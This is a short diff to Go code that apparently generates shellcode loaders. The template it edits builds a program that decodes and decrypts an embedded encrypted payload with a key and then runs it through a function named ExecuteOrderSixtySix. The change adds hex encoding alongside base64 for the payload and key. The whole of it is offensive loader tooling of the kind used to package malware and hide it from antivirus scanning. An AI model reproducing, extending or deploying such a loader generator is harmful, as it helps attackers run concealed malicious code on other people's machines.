@@ -102,6 +102,13 @@ go 1.20
 }
 
 func GetMainTemplate(encoding string, key string, sc string) string {
+
+    /* if hex encoding is used, it does not require to go through StdEncoding */
+    encCall := "enc.StdEncoding"
+    if encoding == "hex" {
+        encCall = "enc"
+    }
+
 	return fmt.Sprintf(`
 package main
 
@@ -115,8 +122,8 @@ var Code = %s
 
 func main() {
 
-    decodedSc, _ := enc.StdEncoding.DecodeString(Code)
-    decodedKey, _ := enc.StdEncoding.DecodeString(Key)
+    decodedSc, _ := %s.DecodeString(Code)
+    decodedKey, _ := %s.DecodeString(Key)
 
     decrypted, err := Decrypt(decodedSc, decodedKey)
     if err != nil {
@@ -125,5 +132,5 @@ func main() {
 
     ExecuteOrderSixtySix(decrypted)
 }
-    `, encoding, key, sc)
+    `, encoding, key, sc, encCall, encCall)
 }
